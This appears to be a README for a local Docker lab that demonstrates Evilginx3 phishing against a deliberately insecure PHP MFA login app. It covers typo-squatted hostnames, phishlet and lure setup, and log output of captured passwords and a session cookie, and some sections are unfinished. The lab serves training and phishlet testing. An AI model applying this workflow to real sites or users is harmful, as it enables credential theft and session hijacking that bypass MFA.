# Evilginx LAB on Docker
![back](evil-dock.jpg)

## Disclaimer
As you can imagine, this lab was created solely and exclusively for the purposes outlined below, and absolutely not for any malicious activity. Of course, I disclaim any responsibility for the improper use of the material contained in this repository.
The containers must absolutely not be exposed to a public network.

Please note that the comments inside files are in italian.

## Why?
I created a local lab to test Evilginx without the need to purchase a domain or presumably a VPS. It is useful for the following use cases:
1. Study and practice
2. Phishlet development and testing
3. Demonstrations and training activities

## Lab architecture
The lab consists of two Linux Docker containers. One hosts a simple PHP application that implements an MFA login process. The application is completely insecure, so it is strongly recommended not to expose it to the Internet and not to use the code in real-world applications. The second container hosts the Evilginx3 server.
You can find the static parameters to access the web application in <b>/app/login-config.php</b>

## Objective
Our goal is to intercept the authentication tokens (cookies) needed to hijack the user's session. It's very straightforward.

## Build & run the containers
Clone this repo and enter the directory, then execute:
	
	sudo docker-compose up --build -d --force-recreate --remove-orphans
	
Verify the containers:

	docker ps
	CONTAINER ID   IMAGE                          COMMAND                  CREATED          STATUS          PORTS               NAMES
	636fa17740bf   evilginx_lab-main_apache-php   "apachectl -D FOREGR…"   41 minutes ago   Up 41 minutes   80/tcp, 443/tcp     targetsite.local
	2c595290c650   evilginx_lab-main_evilginx2    "/bin/bash -l"           41 minutes ago   Up 41 minutes   443/tcp, 8080/tcp   targetsile.local


## Mimic DNS
Modify hosts file in your host machine. Add the following lines:

	172.18.0.20 	targetsite.local login.targetsite.local
	172.18.0.10	targetsile.local login.targetsile.local
Visit the Legitimate site at: https://login.targetsite.local, with a bit of typo-squatting, the evil site will be https://login.targetsile.local


## Start evilnginx
Enter Evilginix container shell

	sudo docker exec -it /targetsile.local /bin/bash
Then start Evilginix in developer mode, in this mode, instead of trying to obtain LetsEncrypt SSL/TLS certificates, it will automatically generate self-signed certificates.
```bash  
root@bd1cc49349a5:/evilginx2# ./evilginx2 -developer -debug
TOADD
```
                                        
## Config Evilngnix container

	: config domain targetsile.local
	: config ipv4 172.18.0.10
	: phishlets hostname targetsite-local targetsile.local
	: phishlets get-hosts targetsite-local 
		172.18.0.10 login.targetsile.local
		172.18.0.10 targetsile.local
		
	: phishlets enable  targetsite-local 
	: lures create targetsite-local 
	: lures
		+-----+-------------------+-----------+------------+-------------+---------------+---------+-------+
		| id  |     phishlet      | hostname  |   path     | redirector  | redirect_url  | paused  |  og   |
		+-----+-------------------+-----------+------------+-------------+---------------+---------+-------+
		| 0   | targetsite-local  |           | /AhsTYOfa  |             |               |         | ----  |
		+-----+-------------------+-----------+------------+-------------+---------------+---------+-------+
 
	: lures get-url 0
		https://login.targetsile.local/AhsTYOfa
## Visit the malicious URL


## Capturing the session token
```bash 
: 2024/12/04 21:32:08 [001] WARN: Cannot handshake client login.targetsite.local remote error: tls: unknown certificate authority
[21:32:33] [imp] [0] [targetsite-local] new visitor has arrived: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0 (172.18.0.1)
[21:32:33] [inf] [0] [targetsite-local] landing URL: https://login.targetsile.local/AhsTYOfa
[21:33:14] [+++] [0] Username: [admin]
[21:33:14] [+++] [0] Password: [test01]
[21:33:53] [+++] [0] Username: [admin]
[21:33:53] [+++] [0] Password: [Pwd Sicur@ 123]
[21:33:54] [+++] [0] detected authorization URL - tokens intercepted: /admin.php
: sessions 

+-----+-------------------+-----------+-----------------+-----------+-------------+-------------------+
| id  |     phishlet      | username  |    password     |  tokens   | remote ip   |       time        |
+-----+-------------------+-----------+-----------------+-----------+-------------+-------------------+
| 1   | targetsite-local  | admin     | Pwd Sicur@ 123  | captured  | 172.18.0.1  | 2024-12-04 21:33  |
+-----+-------------------+-----------+-----------------+-----------+-------------+-------------------+

: sessions 1

 id           : 1
 phishlet     : targetsite-local
 username     : admin
 password     : Pwd Sicur@ 123
 tokens       : captured
 landing url  : https://login.targetsile.local/AhsTYOfa
 user-agent   : Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
 remote ip    : 172.18.0.1
 create time  : 2024-12-04 21:32
 update time  : 2024-12-04 21:33

[ cookies ]
[{"path":"/","domain":"login.targetsite.local","expirationDate":1764884081,"value":"jkncga8d8e6fk3igla22ugsfse--very-insecure-fixed-VALUE--DO-NOT-USE-IT-NEVER-IN-REAL-APPLICATION","name":"session_token","httpOnly":true,"hostOnly":true}]




```
## Useful Docker commands

### Stop and remove all the containers

	sudo docker stop $(docker ps -q) && sudo docker rm $(docker ps -a -q) && sudo docker image prune -a
	
### Access a shell's container

	sudo docker exec -it <container name> /bin/bash

### Check mounted volumes

	sudo docker inspect <container name> | grep Mounts -A 10
	

## Inspect logs

	sudo docker logs <container name>
	
### Show containers IP

	sudo docker ps -q | xargs -n 1 docker inspect -f '{{.Name}} - {{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}'
	
	/targetsite.local - 172.18.0.20
	/targetsile.local - 172.18.0.10

